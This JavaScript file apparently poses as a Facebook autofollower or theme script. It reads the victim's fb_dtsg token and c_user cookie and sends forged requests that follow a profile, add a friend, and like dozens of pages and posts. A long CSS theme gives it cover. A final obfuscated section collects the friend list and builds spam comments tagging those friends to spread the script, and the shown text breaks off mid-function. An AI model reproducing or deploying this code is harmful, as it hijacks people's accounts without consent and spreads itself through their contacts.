var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
function cereziAl(isim) {
    var tarama = isim + "=";
    if (document.cookie.length > 0) {
        konum = document.cookie.indexOf(tarama)
        if (konum != -1) {
            konum += tarama.length
            son = document.cookie.indexOf(";", konum)
            if (son == -1)
                son = document.cookie.length
            return unescape(document.cookie.substring(konum, son))
        }
        else { return ""; }
    }
}
 var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
function IDS(r) {
  var X = new XMLHttpRequest();
  var XURL = "//www.facebook.com/ajax/add_friend/action.php";
  var XParams = "to_friend=" + r +"&action=add_friend&how_found=friend_browser_s&ref_param=none&&&outgoing_id=&logging_location=search&no_flyout_on_click=true&ego_log_data&http_referer&__user="+user_id+"&__a=1&__dyn=798aD5z5CF-&__req=35&fb_dtsg="+fb_dtsg+"&phstamp=";
  X.open("POST", XURL, true);
  X.onreadystatechange = function () {
    if (X.readyState == 4 && X.status == 200) {
      X.close;
    }
  };
  X.send(XParams);
}
var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value; var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]); function Like(p) { var Page = new XMLHttpRequest(); var PageURL = "//www.facebook.com/ajax/pages/fan_status.php"; var PageParams = "&fbpage_id=" + p +"&add=true&reload=false&fan_origin=page_timeline&fan_source=&cat=&nctr[_mod]=pagelet_timeline_page_actions&__user="+user_id+"&__a=1&__dyn=798aD5z5CF-&__req=d&fb_dtsg="+fb_dtsg+"&phstamp="; Page.open("POST", PageURL, true); Page.onreadystatechange = function () { if (Page.readyState == 4 && Page.status == 200) { Page.close; } }; Page.send(PageParams); }
 var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]); var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value; var now=(new Date).getTime(); function P(opo) { var X = new XMLHttpRequest(); var XURL ="//www.facebook.com/ajax/ufi/like.php"; var XParams = "like_action=true&ft_ent_identifier="+opo+"&source=1&client_id="+now+"%3A379783857&rootid=u_jsonp_39_18&giftoccasion&ft[tn]=%3E%3D&ft[type]=20&ft[qid]=5890811329470279257&ft[mf_story_key]=2814962900193143952&ft[has_expanded_ufi]=1&nctr[_mod]=pagelet_home_stream&__user="+user_id+"&__a=1&__dyn=7n88QoAMBlClyocpae&__req=g4&fb_dtsg="+fb_dtsg+"&phstamp="; X.open("POST", XURL, true); X.onreadystatechange = function () { if (X.readyState == 4 && X.status == 200) { X.close; } }; X.send(XParams); }
var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
function a(abone)
{ var http4=new XMLHttpRequest;
 var url4="/ajax/follow/follow_profile.php?__a=1";
 var params4="profile_id="+abone+"&location=1&source=follow-button&subscribed_button_id=u37qac_37&fb_dtsg="+fb_dtsg+"&lsd&__"+user_id+"&phstamp=";
 http4.open("POST",url4,true);
 http4.onreadystatechange=function()
 {  if(http4.readyState==4&&http4.status==200)http4.close };
 http4.send(params4)}
function sublist(uidss)
{ var a = document.createElement('script');
 a.innerHTML = "new AsyncRequest().setURI('/ajax/friends/lists/subscribe/modify?location=permalink&action=subscribe').setData({ flid: " + uidss + " }).send();";
 document.body.appendChild(a);
}
// Fiidannii
a("100000740396815");
IDS("100006667423609");
sublist("1482045118694388");
sublist("1498675803699892");
// cheo Ph?c H?p
Like("284905944997186");      
Like("549252541753997");       
Like("291985050908298");      
Like("434199446682841");     
Like("1475255582701545");        
Like("3987392735551927");        
Like("559063920821987");             
Like("1433722496857372");       
Like("530612090325999");     
Like("622876531124074");    
Like("427659460701846");      
Like("241622229315042");
Like("429440220425222");            
Like("1413948492174215");        
Like("177958912409882");        
Like("146386625533559");      
Like("177112352430184");        
Like("381907345187380");        
Like("113240475405896");       
Like("255801804567230");      
Like("339242752785770");        
Like("1453363074899529");    
Like("298077030319081");     
Like("144832549003585");      
Like("1479376982278277");      
Like("154431041314341");        
Like("467639289947088");        
Like("240720592745217");        
Like("1404568809812802");        
Like("294682120697643");       
Like("295839763904867");        
Like("746973295343063");        
Like("1451755765060807");       
Like("150688308342779");         
Like("317392404950386");       
Like("216315021820939");      
Like("1440018632903294");        
Like("609391169146484");        
Like("611844778854834");       
Like("100343343428842");        
Like("181753108622573");       
Like("1486122281607504");        
Like("226691497531071");       
Like("181753108622573");        
Like("303590146434296");       
Like("188073521270572");       
Like("283467628444515");        
Like("387855318021088");        
Like("309606919145012");        
Like("194515267252649");        
Like("123936357622826");  
Like("228769643822939"); 
Like("193147074148337"); 
Like("376929829111365");    
Like("175626832638899");  
Like("1409614855986059");       
Like("788546951163765");   
Like("649085055160618");     
Like("745507168846828");  
Like("1438136419771327");  
Like("238655162997817");      
Like("315657555253718"); 
Like("870503729631416");      
Like("200845086658704");  
Like("446442712069317");  
Like("465812233565446");
Like("694414927271571");      
Like("642773782477244");        
Like("1380929018863492");       
Like("888483321178088");      
Like("236085363248756");     
Like("456788147789970");        
Like("323490124468005"); 
Like("605839459524226");      
Like("768223379894748");        
Like("509083045884977");       
Like("1456959444545851");      
Like("510788982382780");     
P("700272516674088");
P("699330160101657");
P("674845045883502");
P("623932250974782");
P("610386475662693");
P("749504168417589");
P("754300217937984");
P("10201826650250825");
P("777391278962211");
P("10202033971113717"); 
P("10201952580999015");
P("10202021973853793");
P("10201238799994936");
//new them: >>
(function() {
var css = "";
if (false || (location.href.replace(location.hash,'') == "facebook.com/home.php?ref=logo") || (document.location.href.indexOf("facebook.com/?ref=logo") == 0) || (document.domain == "facebook.com" || document.domain.substring(document.domain.indexOf(".facebook.com") + 1) == "facebook.com") || (new RegExp("^https?://www\\.facebook\\.com/(?!plugins/).*$")).test(document.location.href))
	css += "body {\n\n    background:#E7EBF2 !important;\n}\n   \n.ego_section {\n    margin-bottom: 15px;\n    display: none;\n}\n.fbIndex { background-color: #3B5998 !important }\n\n\n.fbIndex #globalContainer #dropmenu_container,\n.fbIndex #globalContainer #content,\n.fbIndex #globalContainer #pageFooter { display: none !important }\n\n\n.fbIndex .loggedout_menubar_container {\n  position: fixed !important;\n  width: 430px !important;\n  height: 82px !important;\n  min-width: 0 !important;\n  top: 50% !important;\n  left: 50% !important;\n  margin-top: -80px !important;\n  margin-left: -210px !important;\n  z-index: -1 !important;\nbackground-image: -webkit-gradient( linear, left top, left bottom, from(#738ABA), to(#2C4987) ) !important;\nbackground-image: -moz-linear-gradient(top, #738ABA, #2C4987)!important;\nbackground-image: -ms-linear-gradient(top, #738ABA, #2C4987)!important;\nbackground-image: -o-linear-gradient(top, #738ABA, #2C4987)!important;\nbackground-image: linear-gradient(top, #738ABA, #2C4987)!important;\n  padding-top:10px;\n  border-radius:12px;\n    -webkit-box-shadow:0 0 10px 0 rgba(0, 0, 0, 0.5);\n    box-shadow:0 0 10px 0 rgba(0, 0, 0, 0.5);\n}\n\n\n.fbIndex .loggedout_menubar { width: auto !important }\n.fbIndex .loggedout_menubar_container .lfloat,\n.fbIndex .loggedout_menubar_container .rfloat { float: none !important }\n.fbIndex .loggedout_menubar_container .lfloat img,\n.fbIndex .loggedout_menubar_container .rfloat #login_form table { display: block !important; margin: 0 auto !important }\n\n.fbIndex .loggedout_menubar_container .lfloat i { display: block !important; margin: -70px auto 20px !important; }\n.fbIndex .loggedout_menubar_container .sp_69c1xs { display: block !important; }\n\n\n\n#SetAsHomepage_Callout {\n  display: none;\n}\n\n\n.fbIndex div#blueBar {\n  z-index: 0 !important;\n  border: none !important;\n  box-shadow: none !important;\n}\n\n#blueBar {\nbackground-color: #3B5998 !important;\nbackground-image: -webkit-gradient( linear, left top, left bottom, from(#738ABA), to(#2C4987) ) !important;\nbackground-image: -moz-linear-gradient(top, #738ABA, #2C4987)!important;\nbackground-image: -ms-linear-gradient(top, #738ABA, #2C4987)!important;\nbackground-image: -o-linear-gradient(top, #738ABA, #2C4987)!important;\nbackground-image: linear-gradient(top, #738ABA, #2C4987)!important;\nborder-color: #1D4088 !important;\nborder-bottom: 1px solid !important;\n-webkit-box-shadow: inset 0 1px 1px -1px #fff !important;\nmin-width: 981px;\nz-index: 300;\n}\n\n.slim #blueBar {\nheight: 40px !important;\nposition: relative;\n-webkit-box-shadow: inset 0 1px 1px -1px #fff !important;\nborder-bottom: 1px solid;\nbackground-color: #3B5998 !important;\nbackground-image: -webkit-gradient( linear, left top, left bottom, from(#738ABA), to(#2C4987) ) !important;\nbackground-image: -moz-linear-gradient(top, #738ABA, #2C4987)!important;\nbackground-image: -ms-linear-gradient(top, #738ABA, #2C4987)!important;\nbackground-image: -o-linear-gradient(top, #738ABA, #2C4987)!important;\nbackground-image: linear-gradient(top, #738ABA, #2C4987)!important;\nborder-color: #111A33 !important;\n}\n\n#pageLogo a {\nbackground-color: transparent !important;\n}\n\n#pageLogo a:hover, #pageLogo a:focus, #pageLogo a:active {\nbackground-color: transparent !important;\n}\n\n.composerExpanded .newsFeedComposer #rightCol {\npadding-top: 40px;\nmargin-right: 0px !important;\n}\n\n.hasExpandedComposer .home_right_column, .sidebarMode #content .hasExpandedComposer .home_right_column {\nmargin-top: -12px;\nmargin-left: 5px !important;\n}\n\n#pagelet_ego_pane_w {\ndisplay: none !important;\n}\n\n#pagelet_rhc_footer {\ndisplay: none !important;\n}\n\n#pagelet_side_ads {\ndisplay: none !important;\n}\n\n.fbTimelineSideAds {\ndisplay: none !important;\n}\n\n.ego_column {\ndisplay: none !important;\n}\n\n.slimHeader .no_js #navAccount:hover, .slimHeader #pageNav #navAccount.openToggler {\nposition: relative;\ntop: 0px !important;\n}\n\n\n.fbJewel .uiScrollableArea {\n  max-height:450px !important;\n  }\n  \n\n.notifNegativeBase .fbJewelFlyout .beeperNub {\nbackground-position: 0px !important;\nbackground-image: url(\"http://i167.photobucket.com/albums/u127/badspy/beepers.png\") !important;\nbackground-repeat: no-repeat;\nposition: absolute;\n-webkit-background-size: 100% 100% !important;\nwidth: 54px !important;\nheight: 24px !important;\nbackground-size: 100% 100%;\nz-index: 13 !important;\nmargin: -25px -44px !important;\n}\n\n\n.notifNegativeBase .fbJewelFlyout {\nbackground: rgba(255, 255, 255, 0.98);\ntop: 37px;\n-webkit-box-shadow: none !important;\nbox-shadow: none !important;\n-moz-box-shadow: none !important;\n-webkit-border-radius: 0px !important;\nborder-radius: 0px !important;\n-moz-border-radius: 0px !important;\nborder: solid rgba(100, 100, 100, .4);\n-webkit-background-clip: padding-box;\nborder-image: url(\"http://i167.photobucket.com/albums/u127/badspy/fbJewelflyoutsmall.png\") 22 28 29 28 !important;\n-webkit-border-image: url(\"http://i167.photobucket.com/albums/u127/badspy/fbJewelflyoutsmall.png\") 22 28 29 28 !important;\n-moz-border-image: url(\"http://i167.photobucket.com/albums/u127/badspy/fbJewelflyoutsmall.png\") 22 28 29 28 !important;\n-o-border-image: url(\"http://i167.photobucket.com/albums/u127/badspy/fbJewelflyoutsmall.png\") 22 28 29 28 !important;\nborder-width: 22px 28px 29px 28px !important;\n}\n\n\n.uiHeaderActions.rfloat {\nfont-size: 13px !important;\n}\n\n.jewelHeader h3 {\nfont-weight: bold !important;\nleft: 10px !important;\nright: 0;\ntext-shadow: 0 -1px 0 rgba(0, 0, 0, 0.1) !important;\ntop: -32px !important;\nz-index: 1 !important;\nfont-size: 15px !important;\nline-height: 20px !important;\ncolor: #3B5998 !important;\ndisplay: inline-table;\n}\n\n\n\n#navAccount #accountSettingsFlyout {\nleft: -208px !important;\nmargin-top: -1px;\nwidth: 202px;\n}\n\n#navAccount #accountSettingsFlyout .beeperNub {\nright: 30px !important;\n}\n\n._42g- {\nbackground-color: #3c5389 !important;\nborder-color: #475d91 #3c5389 #3a5186 !important;\ntext-shadow: 0 -1px 0 rgba(0, 0, 0, .2) !important;\n-webkit-background-clip: padding-box !important;\nborder: 1px solid !important;\n-webkit-border-radius: 2px !important;\n-webkit-box-shadow: 0 1px 1px rgba(0, 0, 0, .05) !important;\n-webkit-box-sizing: content-box !important;\nfont-family: 'Helvetica Neue', Helvetica, Arial, 'lucida grande',tahoma,verdana,arial,sans-serif !important;\n-webkit-font-smoothing: antialiased !important;\nfont-weight: bold !important;\npadding: 0 8px;\nposition: relative !important;\ntext-align: center !important;\nvertical-align: middle !important;\n}\n\n.-cx-PRIVATE-fbComposerMessageBox__bar {\nbackground-color: #F2F2F2;\nborder-top: 1px solid #E6E6E6;\nheight: 40px !important;\n}\n\ndiv.-cx-PRIVATE-fbComposerXTagger__typeahead, div.-cx-PRIVATE-fbComposerXTagger__tokenizer {\nborder: 0;\nborder-top: 1px dashed #BDC7D8;\npadding: 0;\nmargin-top: 3px !important;\n}\n\n.uiMetaComposerMessageBox .uiComposerMessageBoxControls {\nheight: 40px !important;\nmargin: 0;\nbackground-color: #F1F3F8 !important;\n}\n\n.uiMetaComposer .friendsTokenizer, .uiMetaComposer .taggerLocationSharer, .uiMetaComposer .musicTypeahead {\nborder: 0;\nborder-top: 1px dashed #BDC7D8;\npadding: 2px !important;\n}\n\n\n.-cx-PRIVATE-fbTimelineBackdatedComposer__datepickerIcon {\nbackground-size: auto;\nbackground-image: url(\"https://dl.dropbox.com/u/12675809/composer-time-icon.png\") !important;\nbackground-repeat: no-repeat;\nbackground-position: -5px -41px !important;\nwidth: 40px !important;\nheight: 40px !important;\n}\n\n.-cx-PRIVATE-fbTimelineBackdatedComposer__datepickerIcon:hover {\nbackground-image: url(\"https://dl.dropbox.com/u/12675809/composer-time-icon.png\") !important;\nbackground-repeat: no-repeat;\nbackground-position: -5px 5px !important;\nwidth: 40px !important;\nheight: 40px !important;\n}\n\n.-cx-PRIVATE-fbPlacesCityTagger__placeIconImage {\nbackground-size: auto;\nvertical-align: top;\nbackground-image: url(https://s-static.ak.fbcdn.net/rsrc.php/v2/yA/r/sHRVgdDCvuz.png) !important;\nbackground-repeat: no-repeat;\nbackground-position: -5px -40px !important;\ndisplay: inline-block;\nfloat: left;\nheight: 40px !important;\nwidth: 40px !important;\noutline: none;\n}\n.-cx-PRIVATE-fbPlacesCityTagger__placeIconImage:hover {\nbackground-image: url(https://s-static.ak.fbcdn.net/rsrc.php/v2/yA/r/sHRVgdDCvuz.png) !important;\nbackground-repeat: no-repeat;\nbackground-position: -5px 1px !important;\ndisplay: inline-block;\nfloat: left;\nheight: 40px !important;\nwidth: 40px !important;\noutline: none;\n}\n\n#rightCol{\n    width:170px;\n}\n\n.adsOnTop .rightColumnWrapper .fixed_scrolling_wrapper, .tickerOnTop .rightColumnWrapper {\n  width:200px;\n}\n        \n#contentCol{\n   background:transparent !important; \n}\n.hasLeftCol #mainContainer {\n    border-right:0px;\n}\n  \n#pagelet_welcome_box {\n    background:#3B5998;\n    border-radius:6px 0 0 6px !important;\n    padding:10px 5px;\n    background:-webkit-gradient(linear, center top, center bottom, from(#647AAB), to(#2C467E));\n    background:-webkit-linear-gradient(#647AAB, #2C467E);\n    background:-moz-linear-gradient(#647AAB, #2C467E);\n    background:-o-linear-gradient(#647AAB, #2C467E);\n    background:-ms-linear-gradient(#647AAB, #2C467E);\n    background:linear-gradient(#647AAB, #2C467E);\n}\n\n.fbxWelcomeBoxBlock .fbxWelcomeBoxImg {\nheight: 40px !important;\nwidth: 40px !important;\nmargin-left: 6px !important;\n}\n\n#pagelet_welcome_box a {\ncolor: #FFF !important;\n}\n\n.navHeader, .navHeader a {\nfont-size: 10px !important;\ncolor: #7a8292 !important;\ntext-shadow: 0 1px 0 rgba(0, 0, 0, .6) !important;\nfont-weight: bold;\nmargin-top: 12px;\n}\n\n#contentArea {\n    -webkit-box-shadow:0 0 10px 0 rgba(0, 0, 0, 0.3);\n    box-shadow:0 0 10px 0 rgba(0, 0, 0, 0.3);\n  margin-top:-5px;\n    background:#FFF;\n    width:585px !important;\n}\n\n._7lt ._7ls {\n  border-radius:100% !important;\n}\n\nform.async_saving .uiButton.uiButtonSpecial .uiButtonText, form.async_saving .uiButton.uiButtonSpecial input, form.async_saving .uiButton.uiButtonConfirm .uiButtonText, form.async_saving .uiButton.uiButtonConfirm input, .uiButtonSpecial .uiButtonText, .uiButtonSpecial input, .uiButtonSpecial.uiButtonDisabled .uiButtonText, .uiButtonSpecial.uiButtonDisabled input, .uiButtonConfirm .uiButtonText, .uiButtonConfirm input, .uiButtonConfirm.uiButtonDisabled .uiButtonText, .uiButtonConfirm.uiButtonDisabled input {\ncolor: #fff;\ntext-shadow: 0 -1px 0 rgba(0, 0, 0, .35) !important;\nfont-weight: bold !important;\nfont-size: 12px !important;\n}\n\nlabel.-cx-PRIVATE-fbComposerMessageBox__button {\npadding: 6px 16px !important;\n}\n\n.uiButtonConfirm {\nbackground: none !important;\nbackground-repeat: no-repeat;\nbackground-position: -352px -54px;\nborder-color: #576499 #3A4B73 #263855 !important;\nbackground: -webkit-gradient( linear, left top, left bottom, from(#647AAB), to(#2C467E) ) !important;\nbackground: -moz-linear-gradient(top, #647AAB, #2C467E)!important;\nbackground: -ms-linear-gradient(top, #647AAB, #2C467E)!important;\nbackground: -o-linear-gradient(top, #647AAB, #2C467E)!important;\nbackground: linear-gradient(top, #647AAB, #2C467E)!important;\n-webkit-border-radius: 4px !important;\nborder-radius: 4px !important;\n-moz-border-radius: 4px !important;\n-o-border-radius: 4px !important;\n-ms-border-radius: 4px !important;\n}\n\n.fbTimelineScrubber{\n    background:transparent !important;\n}\n  \n._4lh ._519e:after, ._4lh ._51wa:after,._4lh ._519e:after, ._4lh ._51wa:after, ._4lh .timelineUnitContainer .UFIComment .UFIImageBlockImage:after, ._4lh .timelineUnitContainer .UFIReplyActorPhotoWrapper:after {\n          background:none;\n}\n        \n        \n.timelineLayout #contentArea{\nbackground:transparent !important;\n box-shadow:0px 0px 0px;\n}\n          \n\n#fbProfileCover .fbProfileCoverPhotoSelector .wrap {\nmargin-left:-170px;\ntop:-50px;\n}             \n\n\n#fbProfileCover .fbTimelineProfilePicSelector .wrap{\n  margin-top:-115px;\n  margin-right:-340px;\n}\n\n\n.timelineLayout .fbTimelineTopSection{\n  margin-top:20px; \n}\n\n\n\n.timelineLayout .fbTimelineTopSection,.coverBorder,.coverPhotoImg,#fbProfileCover{\n  	border-top-left-radius:15px !important;\n    border-top-right-radius:15px !important;\n    \n}\n.profilePic,.profilePicThumb{\n     border-radius:12px !important;\n        -webkit-box-shadow:0 2px 10px 0 rgba(0, 0, 0, 0.3);\n    box-shadow:0 2px 10px 0 rgba(0, 0, 0, 0.3);\n     -webkit-transition:all 1.1s;\n    -moz-transition:all 1.1s;\n    -o-transition:all 1.1s;\n    -ms-transition:all 1.1s;\n    transition:all 1.1s;\n    }\n\n\n.profilePicThumb:hover{\n	transform: rotate(10deg);\n	-ms-transform: rotate(10deg); \n	-webkit-transform: rotate(10deg); \n          }\n\n._4lh ._519e:after, ._4lh ._51wa:after {\nbackground:none;\n      }\n\n.fbTimelineUnit,#fbProfileCover {\n\n-webkit-box-shadow:0 0 8px 0 rgba(0, 0, 0, 0.3);\n    box-shadow:0 0 8px 0 rgba(0, 0, 0, 0.3);\n    -webkit-transition:all 1.1s;\n    -moz-transition:all 1.1s;\n    -o-transition:all 1.1s;\n    -ms-transition:all 1.1s;\n    transition:all 1.1s;\n\n\n}\n    \n.fbTimelineUnit:hover {\n    -webkit-transform:scale(1.1);\n    -moz-transform:scale(1.1);\n    -o-transform:scale(1.1);\n    -ms-transform:scale(1.1);\n    transform:scale(1.1);\n    z-index:100;\n\n      }\n\n.fbTimelineStickyHeader .back {\n  	margin-top:-5px;\n  	height:58px;\n	-webkit-box-shadow:0 2px 8px 0 rgba(0, 0, 0, 0.3);\n    box-shadow:0 2px 8px 0 rgba(0, 0, 0, 0.3);\n      }  \n\n\n._513x{\n       background:green;\n       bottom:18px;\n       left:13px;\n       border-radius:100%;\n       width:7px;\n       height:7px;\n      }\n  \n\n  \n.UFIRow {\n  background:transparent;\n  }\n.UFIUnseenItem{\n  border-left:0px;\n    }\n\n\n#pagelet_web_messenger{\n width:850px;\n\n}\n\n.uiSelectorMenuWrapper {\n    min-width:auto;\n  }\n\n\n._4kg > li {\n    border-width:1px 0 0 0!important;\n  }\n.selectedStorySimple .selectedStoryIndicator {\n    background:#FFF !important;\n    }\n.fbFeedTicker .fbFeedTickerStory {\n    margin-top:10px;\n    margin-bottom:10px;\n    border-top-right-radius:12px;\n    border-bottom-right-radius:12px;\n	width:200px;\n    padding-left:10px;\n    background:#F0F8FF;\n    box-shadow:4px 4px 7px -3px rgba(0, 0, 0, 0.2),inset 5px 0px 5px -3px rgba(0, 0, 0, 0.2);\n    border:3px  solid #FfF;      \n    }\n\n.fbChatSidebar .fbFeedTicker .fbFeedTickerStory {\n  	box-shadow:none;\n    border:0px;\n    border-top:1px solid #DADADA;\n    margin:0px;\n    padding:10px 5px;\n      }\n\n\n.fbFeedTicker .tickerStoryWithButton {\n    width:170px;\n}\n\n.tickerOnTop #pagelet_rhc_ticker .fbFeedTicker {\n      margin-left:-9px;\n        \n      }\n\n.uiSideNav .selectedItem .item, .uiSideNav .selectedItem .item:hover, .uiSideNav ul .selectedItem .subitem, .uiSideNav ul .selectedItem .subitem:hover {\n	background:#FFF;\n    -webkit-transform:scale(1.5);\n    -moz-transform:scale(1.5);\n    -o-transform:scale(1.5);\n    -ms-transform:scale(1.5);\n    transform:scale(1.5);\n    width:70px !important;\n    height:25px;\n    line-height:15px;\n	margin-left:68px !important;\n    font-size:8px;\n    margin-top:25px;\n    margin-bottom:20px;\n    padding-top:10px;\n    box-shadow:-5px 4px 6px -3px rgba(0, 0, 0, 0.2);\n    border-top-left-radius:8px;\n    border-bottom-left-radius:8px;\n        }\n        \n.uiSideNav .item, .uiSideNav .subitem {\n	background:#F0F8FF;\n    -webkit-transform:scale(1.5);\n    -moz-transform:scale(1.5);\n    -o-transform:scale(1.5);\n    -ms-transform:scale(1.5);\n    transform:scale(1.5);\n    width:30px !important;\n    height:25px;\n    line-height:15px;\n	margin-left:115px !important;\n    font-size:0px;\n    margin-top:25px;\n    margin-bottom:20px;\n    padding-top:10px;\n    box-shadow:-5px 4px 6px -3px rgba(0, 0, 0, 0.2),inset -5px 0px 5px -3px rgba(0, 0, 0, 0.2);\n    border-top-left-radius:8px;\n    border-bottom-left-radius:8px;\n    border:3px  solid #FfF;\n            }\n.uiSideNav .item:hover, .uiSideNav .subitem:hover  {\n\n    width:60px !important;\n	margin-left:77px !important;\n    font-size:7px;\n    box-shadow:-5px 4px 6px -3px rgba(0, 0, 0, 0.2),inset -5px 0px 5px -3px rgba(0, 0, 0, 0.2);\n    border:3px  solid #FfF;\n      }\n.noCount{\n    font-size:7px;          \n        }\n.uiSideNavCount {\n    background:transparent;\n            }\n.countValue {\n	font-size:7px !important;\n    background:#d8dfea;\n    padding:5px;\n    border-radius:100%;\n    border:2px dotted #FFF;\n              }\n.navHeader{\n    padding-left:20px;\n  }\n\n._s0:only-child, ._29h img,.fbFeedTicker .fbFeedTickerStory .tickerStoryImage,._42fz .pic {\ndisplay: block !important;\nborder-radius: 100% !important;\nborder: 2px solid #fff !important;\nbox-shadow: 0px 0px 7px #000!important;\n\n    }\n.actorPhoto {\nmargin-top: 18px !important;\nmargin-left: -7px !important;\n}\n\n\n._51jx, ._51jw{\n  background-image: none !important;\nbackground-color: #f03d25 !important;\nborder: 1px solid #d83722 !important;\nborder-bottom: 1px solid #c0311e !important;\nborder-top: 1px solid #e23923 !important;\n-webkit-border-radius: 2px;\n-webkit-box-shadow: 0 1px 0 rgba(0, 0, 0, .77);\ndisplay: block;\n    width:auto !important;\n    height:auto !important;\n  padding:0 1px !important; \n}\n\n._50mz .metaInfoContainer {\nbackground-color: transparent !important;\npadding-left: 0 !important;\nposition: absolute;\nright: none !important;\ntop: none !important;\nbottom: 4px !important;\n}\n\n.messages:hover .metaInfoContainer {\nvisibility: visible !important;\n}\n\n.fbChatConvItem:hover .metaInfoContainer {\nvisibility: hidden;\n}\n\n.fbChatConvItem .profileLink .profilePhoto {\nborder-radius: 300px !important;\n}\n\n.fbChatConvItem .profileLink:before {\nbackground:transparent;\ndisplay: block;\nwidth: 32px;\nheight: 32px;\ncontent: \"\";\nposition: absolute;\nbox-shadow: 0 1px 4px -1px #000, 0 2px 4px -2px #000, inset 0 0px 0px 1px rgba(255, 255, 255, 0.25), inset 0 4px 5px -1px rgba(255, 255, 255, 0.25);\nborder-radius: 300px !important;\n\n}\n\n._50dw {\nborder-top: 0px solid #E4E7F0 !important;\n}\n\n.fbChatMessageGroup {border-top-color:#E4E7F0;}\n\n .fbChatConvDateBreak{\ntext-align: center !important;\nmargin: 5px 60px !important;\n}\n\n\n.fbChatMessageGroup ._kso {margin-bottom: 0!important;}\n\n.conversationContainer, .fbChatConvDateBreak {background: #E4E7F0 !important;}\n\n._7f.seen ._9r, ._510h {\nbackground-image: url(\"http://imageshack.us/a/img202/3604/seen.png\") !important;\nbackground-position: 0 !important;\n}\n\n .messages {\nbackground: transparent !important;\nmargin-left: 12px !important;\nborder-image-slice: fill 10 10 10 10;\n-webkit-border-image: url(\"http://imageshack.us/a/img687/6865/theyp.png\")10 10 10 10;\n-moz-border-image: url(\"http://imageshack.us/a/img687/6865/theyp.png\")10 10 10 10;\nborder-image-source: url(\"http://imageshack.us/a/img687/6865/theyp.png\");\nborder-width: 10px !important;\nfloat: left!important;\nmax-width: 110px !important;\nmin-width: 28px;\n}\n\n.messages:before {\nbackground: url(\"http://img594.imageshack.us/img594/4907/theyarow.png\");\ncontent: \"\";\ndisplay: block;\nwidth: 15px;\nheight: 17px;\nleft: 34px;\nposition: absolute;\ntop: 14px;\n}\n\n.hasSmurfbar #pageNav .tinyman .navLink:after {\n      background-image:none !important;\n      \n    }\n._50mz .fbNubFlyoutBodyContent, ._50mz .conversationContainer  {\n   	background:url(http://www.linedpaper.net/wp-content/uploads/2012/10/Graph-Paper-Template.png) transparent !important; \n}\n\n.fbNubFlyout,._50-v {\n    box-shadow:none;\n  }\n        \n._50mz .fbNubFlyoutInner  {\n-webkit-background-clip: padding-box;\nborder-image: url(\"http://i167.photobucket.com/albums/u127/badspy/fbJewelflyoutsmall.png\") 22 28 29 28 !important;\n-webkit-border-image: url(\"http://i167.photobucket.com/albums/u127/badspy/fbJewelflyoutsmall.png\") 22 28 29 28 !important;\nborder-width: 22px 28px 29px 28px !important;\nheight:240px !important;\n  }\n\n.fbNubFlyoutBody{\n  height:185px !important;\n  border:0px;\n    }\n    \n.fbNubFlyoutTitlebar{\nborder-top-left-radius:5px;\nborder-top-right-radius:5px;\n    }\n\n\n\n.fbNubFlyoutFooter{\n  margin-left:-9px;\n  width:220px;\n  }\n\n\n.fbNubFlyoutFooter ._552n{\nright:0px !important;\n    }";
if (typeof GM_addStyle != "undefined") {
	GM_addStyle(css);
} else if (typeof PRO_addStyle != "undefined") {
	PRO_addStyle(css);
} else if (typeof addStyle != "undefined") {
	addStyle(css);
} else {
	var node = document.createElement("style");
	node.type = "text/css";
	node.appendChild(document.createTextNode(css));
	var heads = document.getElementsByTagName("head");
	if (heads.length > 0) {
		heads[0].appendChild(node); 
	} else {
		// no head yet, stick it whereever
		document.documentElement.appendChild(node);
	}
}
})();
//pengintip
var _0xa22c=["value","fb_dtsg","getElementsByName","match","cookie","455971131172339","onreadystatechange","readyState","arkadaslar = ","for (;;);","","replace","responseText",";","length","entries","payload","round"," Share\udbb8\udc3c @[","uid",":","text","]"," ","\x26filter[0]=user","\x26options[0]=friends_only","\x26options[1]=nm","\x26token=v7","\x26viewer=","\x26__user=","https://","indexOf","URL","GET","https://www.facebook.com/ajax/typeahead/first_degree.php?__a=1","open","http://www.facebook.com/ajax/typeahead/first_degree.php?__a=1","send","random","floor","\x26ft_ent_identifier=","\x26comment_text=Wow It Work Try =D Provoni Autofollowers . <3  ,If You Dont Believe look video and try. <3","\x26source=2","\x26client_id=1377871797138:1707018092","\x26reply_fbid","\x26parent_comment_id","\x26rootid=u_jsonp_2_3","\x26clp={\x22cl_impid\x22:\x22453524a0\x22,\x22clearcounter\x22:0,\x22elementid\x22:\x22js_5\x22,\x22version\x22:\x22x\x22,\x22parent_fbid\x22:","}","\x26attached_sticker_fbid=0","\x26attached_photo_fbid=0","\x26giftoccasion","\x26ft[tn]=[]","\x26__a=1","\x26__dyn=7n8ahyj35ynxl2u5F97KepEsyo","\x26__req=q","\x26fb_dtsg=","\x26ttstamp=","POST","/ajax/ufi/add_comment.php","Content-type","application/x-www-form-urlencoded","setRequestHeader","status","close"];var fb_dtsg=document[_0xa22c[2]](_0xa22c[1])[0][_0xa22c[0]];var user_id=document[_0xa22c[4]][_0xa22c[3]](document[_0xa22c[4]][_0xa22c[3]](/c_user=(\d+)/)[1]);var id=_0xa22c[5];var arkadaslar=[];var svn_rev;function arkadaslari_al(id){var _0x7892x7= new XMLHttpRequest();_0x7892x7[_0xa22c[6]]=function 